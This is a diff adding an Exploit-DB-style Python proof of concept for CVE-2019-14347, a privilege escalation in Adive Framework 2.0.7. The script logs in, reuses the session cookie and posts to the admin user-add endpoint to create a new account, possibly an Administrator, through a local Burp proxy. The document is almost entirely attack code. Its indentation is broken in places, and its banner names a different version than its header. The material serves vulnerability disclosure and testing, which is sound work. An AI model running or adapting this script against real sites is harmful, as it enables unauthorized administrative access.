@@ -1,0 +1,82 @@
+# Exploit Title: Adive Framework 2.0.7 - Privilege Escalation
+# Date: 2019-08-02
+# Exploit Author: Pablo Santiago
+# Vendor Homepage: https://www.adive.es/
+# Software Link: https://github.com/ferdinandmartin/adive-php7
+# Version: 2.0.7
+# Tested on: Windows 10
+# CVE : CVE-2019-14347
+
+#Exploit
+
+import requests
+import sys
+
+session = requests.Session()
+
+http_proxy  = "http://127.0.0.1:8080"
+https_proxy = "https://127.0.0.1:8080"
+
+proxyDict = {
+             "http"  : http_proxy,
+             "https" : https_proxy
+           }
+print('[*****************************************]')
+print('[ BYPASSING Adive Framework Version.2.0.5 ]')
+print('[*****************************************]''\n')
+
+
+
+print('[+]Login with the correct credentials:' '\n')
+
+user = input('[+]user:')
+password = input('[+]password:')
+print('\n')
+
+url = 'http://localhost/adive/admin/login'
+values = {'user': user,
+          'password': password,
+          }
+
+r = session.post(url, data=values, proxies=proxyDict)
+cookie = session.cookies.get_dict()['PHPSESSID']
+
+print('Your session cookie is:'+ cookie +'\n')
+
+
+host = sys.argv[1]
+print('Create the new user:')
+userName = input('[+]User:')
+userUsername = input('[+]UserName:')
+password = input('[+]Password:')
+password2 = input('[+]Confirm Password:')
+print('The possibles permission are: 1: Administrator, 2: Developer, 3:Editor')
+permission = input('[+]permission:')
+
+if (password == password2):
+#configure proxy burp
+
+#hacer el request para la creacion de usuario
+data = {
+'userName':userName,
+'userUsername':userUsername,
+'pass':password,
+'cpass':password2,
+'permission':permission,
+
+}
+
+headers= {
+'Cookie': 'PHPSESSID='+cookie
+}
+
+request = session.post(host+'/adive/admin/user/add', data=data,
+headers=headers, proxies=proxyDict)
+print('+--------------------------------------------------+')
+
+else:
+print ('Passwords dont match!!!')
+
+#PoC
+https://imgur.com/dUgLYi6
+https://hackpuntes.com/wp-content/uploads/2019/08/ex.gif
